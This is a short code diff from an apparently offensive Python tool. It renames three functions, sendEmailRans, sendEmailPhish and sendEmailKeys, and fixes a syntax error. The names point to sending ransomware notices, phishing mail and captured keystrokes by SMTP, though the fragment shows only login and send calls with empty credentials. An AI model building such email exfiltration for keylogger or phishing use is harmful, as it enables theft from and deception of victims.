@@ -91,7 +91,7 @@ def sendEmailRans():
 
     mail.sendmail(user, user, content)
 
-def SendEmailPhish():
+def sendEmailPhish():
     from email.message import EmailMessage
 
     email_user = ''
@@ -113,7 +113,7 @@ def SendEmailPhish():
         smtp.login(user, password)
         smtp.send_message(msg)
 
-def SendEmailKeys:
+def sendEmailKeys():
     from email.message import EmailMessage
 
     email_user = ''
